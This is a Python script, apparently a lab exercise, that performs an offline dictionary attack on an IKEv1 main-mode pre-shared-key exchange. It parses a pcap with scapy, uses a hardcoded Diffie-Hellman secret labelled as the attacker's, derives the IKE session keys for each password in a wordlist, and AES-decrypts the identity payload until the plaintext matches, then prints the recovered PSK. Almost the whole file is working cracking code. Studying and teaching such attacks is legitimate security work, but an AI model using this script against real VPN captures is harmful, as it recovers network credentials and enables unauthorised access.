# TODO Your Imports here
from scapy.all import *
from hashlib import sha1
import binascii
import hmac
import ikev1_pcapReader as pcapReader
import ikev1_payloadParser as ikeParser
from Crypto.Cipher import AES

pcapPath = "../pcaps/ikev1-psk-main-mode-incomplete.pcapng"
#dictPath = "../dict/list-simple.txt"
dictPath = "../dict/list.txt"

# required diffie hellman secret of the responder (attacker)
dhSecret = binascii.unhexlify("34B52971CD61F18048EE97D20DA488A4634125F300DC2D1F470BDBB68B989FB999A2721328084C165CBEBDCA0C08B516799132B8F647AE46BD2601028EC7E3954AAF612828826A031FF08B7AE4057CAE0ADB51453BAAE84691705E913BA95067B816385C37D2BD85701501F94A1AA27FFC20A9546EC9DEFF8A1CB33588819A55")

# idHex  = ...||PayloadLength||IDType||ProtocolID||Port||IPAddress
idHex = "0800000c01000000c0a80064"
idPlainValue = binascii.unhexlify(idHex)
idLength = idHex.__len__()


def bytesToHex(byteStr):
    # TODO your code here
    return str(binascii.hexlify(bytes(byteStr)), 'ascii')

#For pre-shared keys: SKEYID = prf(pre-shared-key, Ni_b |   Nr_b)
def computeKey(psk,initNonce,respNonce):
    # TODO your code here
    return hmac.new(psk.encode("ascii"),initNonce+respNonce,sha1)

#SKEYID_d = prf(SKEYID, g^xy | CKY-I | CKY-R | 0)
#SKEYID_a = prf(SKEYID, SKEYID_d | g^xy | CKY-I | CKY-R | 1)
#SKEYID_e = prf(SKEYID, SKEYID_a | g^xy | CKY-I | CKY-R | 2)

def deriveKeys(SKEYID,SKEYID_X,dhSecret,initCookie,respCookie,number):
    # TODO your code here
    #number 0 only dhSecret
    if(number == 0):
        return hmac.new(SKEYID.digest(), dhSecret + initCookie+ respCookie + bytes([number]),sha1)
    else:  #The last element of SKEYID_dhKey is always dhKey
        return hmac.new(SKEYID.digest(), SKEYID_X.digest() + dhSecret + initCookie+ respCookie + bytes([number]),sha1) 

# IV is computed via the SHA1 hash of the Key Exchange parameter
# /* initial IV = hash(g^xi | g^xr) */
def computeIV(initKeX,respKeX):
    # TODO your code here
    IV = sha1()
    IV.update(initKeX)
    IV.update(respKeX)
    return IV.digest()


if __name__ == '__main__':
    # TODO
    # 1. open pcap
    packets = pcapReader.openPCAPFile(pcapPath)
    # 2. get required values
    IPSource, IPDestination = ikeParser.getIPs(packets) # 1. Source 2. Destination

    ikePackets = pcapReader.getISAKMPPackets(packets)
        
    initSAPacket = ikeParser.getIniatorSAPacket(ikePackets)
    respSAPacket = ikeParser.getResponderSAPacket(ikePackets)
        
    initCookie = ikeParser.getCookieFromISAKMP(initSAPacket,False)   
    respCookie = ikeParser.getCookieFromISAKMP(respSAPacket, True)

    initKEX = ikeParser.getPayloadFromISAKMP(ikePackets[2],ikeParser.ISAKMP_KEX_NAME)  #3rd packet has KEX value (Wireshark and Scapy)
    respKEX = ikeParser.getPayloadFromISAKMP(ikePackets[3],ikeParser.ISAKMP_KEX_NAME) #4rd packet has KEX value (Wireshark and Scapy)

    initNONCE = ikeParser.getPayloadFromISAKMP(ikePackets[2],ikeParser.ISAKMP_NONCE_NAME) # same as KEX
    respNONCE = ikeParser.getPayloadFromISAKMP(ikePackets[3],ikeParser.ISAKMP_NONCE_NAME) # same as KEX

    IV = computeIV(initKEX,respKEX)[:16] # IV must be 16 bytes long (ValueError)
    
    encrpytedText = ikeParser.getEncryptedData(packets,IPSource)[1] 
    # 3. read dict line by line
    lines = []
    with open(dictPath, 'r') as dataFile:
        lines = dataFile.read().splitlines()
    
    # 4. compute keys, decrypt encrypted data and compare IDPlainValue

    for psk in lines:
        SKEYID = computeKey(psk,initNONCE,respNONCE)
        SKEYID_d = deriveKeys(SKEYID,'Nothing',dhSecret,initCookie,respCookie,0)
        SKEYID_a = deriveKeys(SKEYID,SKEYID_d,dhSecret,initCookie,respCookie,1)
        SKEYID_e = deriveKeys(SKEYID,SKEYID_a,dhSecret,initCookie,respCookie,2)

        Decrypted = AES.new(SKEYID_e.digest()[:16],AES.MODE_CBC,IV).decrypt(encrpytedText) #The Key must be 16, 24 or 32 bytes long

        if(bytesToHex(Decrypted)[:idLength].lower() == bytesToHex(idPlainValue)):
            print("PSK : " + psk)
